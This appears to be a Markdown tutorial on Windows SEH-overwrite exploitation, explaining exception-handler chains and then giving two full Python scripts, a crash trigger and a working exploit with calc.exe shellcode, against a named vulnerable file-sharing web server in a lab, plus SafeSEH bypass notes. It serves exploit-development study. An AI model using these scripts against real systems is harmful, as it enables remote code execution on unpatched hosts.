#Part2: SEHExploit

## Getting things setup
1. windows XP sp3 32-bit
2. [vulnerable software](https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe)

this vulnerability is a GET HTTP Request Buffer Overflow and could lead to remote code execution. That means it could be exploited from a remote location.

## Structured Exception Handling(SEH)

Windows SEH Chain, from [securitysift](http://www.securitysift.com/wp-content/uploads/2014/03/win_exploit_6_1-1.png)

![](Part2-SEHExploit/Part2-SEHExploit0.png)

Every thread has its own SEH chain, SEH Chain is formed by a chain of Exception Registration Record which structure like this
```
typedef struct _EXCEPTION_REGISTRATION_RECORD { 
    struct _EXCEPTION_REGISTRATION_RECORD *Next; 
    PEXCEPTION_ROUTINE Handler; 
} EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;
```

the first member is a pointer to next _EXCEPTION_REGISTRATION_RECORD, the second member is a pointer to an exception handler function. The function looks like this:

```
EXCEPTION_DISPOSITION 
__cdecl _except_handler(
    struct _EXCEPTION_RECORD *ExceptionRecord,
    oid EstablisherFrame,
    struct _CONTEXT *ContextRecord,
    void * DispatcherContext
);
```

ContextRecord contains registers data when exceptions occur, and bellow is the definition of ExceptionRecord. 
```
typedef struct _EXCEPTION_RECORD {
        DWORD ExceptionCode;
        DWORD ExceptionFlags;
        struct _EXCEPTION_RECORD *ExceptionRecord;
        PVOID ExceptionAddress;
        DWORD NumberParameters;
        DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD;
```

The _except_handler uses the above two information to determine whether this exception can be handled or not. If it can handle this exception, the return value of EXCEPTION_DISPOSITION is ExceptionContinueExecution. Else, it returns ExceptionContinueSearch to tell OS search next _EXCEPTION_REGISTRATION_RECORD.

How to locate SEH Chain?
```
get the first Exception Registration Record
> !teb 
get the SEH chain of current thread
> !exchain
```


## Crash
```
import socket
import os
import time
import sys
import struct


host = "192.168.95.149"
# Port of host
port = 80
BUF_SIZE = 3000

buf = "/.:/"                # Unusual, but needed
# Character pattern buffer to locate SEH offset
buf += "A" * BUF_SIZE
 

 
request = "GET /vfolder.ghp HTTP/1.1\r\n"
request += "Host: " + host + "\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
request += "Accept-Encoding: gzip, deflate" + "\r\n"
request += "Referer: " + "http://" + host + "/" + "\r\n"
request += "Cookie: SESSIONID=16246; UserID=PassWD=" + buf + "; frmUserName=; frmUserPass=;"    # Insert buffer here
request += " rememberPass=pass"
request += "\r\n"
request += "Connection: keep-alive" + "\r\n"
request += "If-Modified-Since: Mon, 19 Jun 2017 17:36:03 GMT" + "\r\n"

print "[*] Connecting to target: " + host

# Set up our socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Attempt to connect to host
    connect = s.connect((host, port))
    print "[*] Successfully connected to: " + host
except:
    print "[!] " + host + " didn't respond...\n"
    sys.exit(0)

# Send payload to target
print "[*] Sending payload to target..."
s.send(request + "\r\n\r\n")
print "[!] Payload has been sent!\n"
s.close()
```

![](Part2-SEHExploit/Part2-SEHExploit1.png)

![](Part2-SEHExploit/Part2-SEHExploit2.png)

![](Part2-SEHExploit/Part2-SEHExploit3.png)


## Jump to shellcode
1. Foud SEH offset is 53 (with Mona), fake SEH get called

2. Found a pointer to "Pop Pop Ret", Jump to Next SEH
```
>!py mona seh
```

Using a code section of the application itself would make our exploit less dependent on OS.

** Don't pick a code section which contains \x00, it's EOF in a string and could lead to exploit fail.**

![](Part2-SEHExploit/Part2-SEHExploit6.png)

3. Found the opcode of Jump 0x10, Jump to Payload


We have talked this in [previous blog](Part1-StackOverflow.md), it is "\xeb\x10".

Since next seh is a 4 bytes pointer, let's pad it to 4 bytes with "\x90\x90".

![](Part2-SEHExploit/Part2-SEHExploit7.png)


```
import socket
import os
import time
import sys
import struct


host = "192.168.95.149"
# Port of host
port = 80
BUF_SIZE = 3000

buf = "/.:/"                # Unusual, but needed
# Character pattern buffer to locate SEH offset
buf += "A" * 53
 
nseh = "\xeb\x10\x90\x90"
seh = struct.pack("<L", 0x1001ab5f)

#payload = "\x90" * 24 + "\xcc"*20

nops = "\x90" * 24
# Calc.exe shellcode payload
payload = "\x31\xC9"                # xor ecx,ecx
payload += "\x51"                   # push ecx
payload += "\x68\x63\x61\x6C\x63"   # push 0x636c6163
payload += "\x54"                   # push dword ptr esp
payload += "\xB8\xC7\x93\xC2\x77"   # mov eax,0x77c293c7
payload += "\xFF\xD0"               # call eax

exploit = buf + nseh + seh + nops + payload

fill = "\x43"*(BUF_SIZE-len(exploit))   # Calculate number of filler bytes to use (C)
buf = exploit + fill    
 
request = "GET /vfolder.ghp HTTP/1.1\r\n"
request += "Host: " + host + "\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
request += "Accept-Encoding: gzip, deflate" + "\r\n"
request += "Referer: " + "http://" + host + "/" + "\r\n"
request += "Cookie: SESSIONID=16246; UserID=PassWD=" + buf + "; frmUserName=; frmUserPass=;"    # Insert buffer here
request += " rememberPass=pass"
request += "\r\n"
request += "Connection: keep-alive" + "\r\n"
request += "If-Modified-Since: Mon, 19 Jun 2017 17:36:03 GMT" + "\r\n"

print "[*] Connecting to target: " + host

# Set up our socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Attempt to connect to host
    connect = s.connect((host, port))
    print "[*] Successfully connected to: " + host
except:
    print "[!] " + host + " didn't respond...\n"
    sys.exit(0)

# Send payload to target
print "[*] Sending payload to target..."
s.send(request + "\r\n\r\n")
print "[!] Payload has been sent!\n"
s.close()
```

Exploit Success!

![](Part2-SEHExploit/Part2-SEHExploit5.png)

## Bypassing SafeSeh 

** Some read notes from [corelan's awesome paper](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/) **

When an exception handler pointer is about to get called, ntdll.dll (KiUserExceptionDispatcher) will check to see if this pointer is in fact a valid EH pointer.

1. First, it tries to eliminate that the code would jump back to an address on the stack directly.It does this by getting the stack high and low address (by looking at the Thread Environment Block’s (TEB) entry, looking at FS:[4] and FS:[8]). If the exception pointer is within that range (thus, if it points to an address on the stack), the handler will not be called.
2. If the handler pointer is not a stack address, the address is checked against the list of loaded modules (and the executable image itself), to see whether it falls within the address range of one of these modules. If the address does not fall within the range of a loaded module ? Well, in that case, the handler is considered safe and will be called. 
3. If the address falls within the range of a loaded module, but the module does not have a Load Configuration Directory(/safeseh:no), the handler would be called. If that isn't the case, the pointer is checked against the list of registered handlers. If there is a match, the pointer is allowed.

So, there are a couple of possible exploit techniques for this new type of SEH protections :

- If the address of the handler, as taken from the exception_registration structure, is outside the address range of a loaded module, then it is still executed.

- If the address of the handler is inside the address range of a loaded module, but this loaded module does not have a Load Configuration Directory, and the DLL characteristics would allow us to pass the SE Handler verification test, the pointer will get called.

- If the pointer to the exception handler is overwritten with a heap address, it will be called. (Of course, this involves loading your exploit in the heap and then trying to guess a more or less reliable address on the heap where you can redirect the application flow to. This may be difficult because this address may not be predictable).



Besides "Pop Pop Ret", Bellow addreses are more compatible with different versions of OS if one of them points to the exception_registration structure.

call dword ptr[esp+nn]� / jmp dword ptr[esp+nn]� / call dword ptr[ebp+nn]� / jmp dword ptr[ebp+nn]� / call dword ptr[ebp-nn]� / jmp dword ptr[ebp-nn]

```
> !py mona jseh
```

## Ref
1. http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html
2. https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/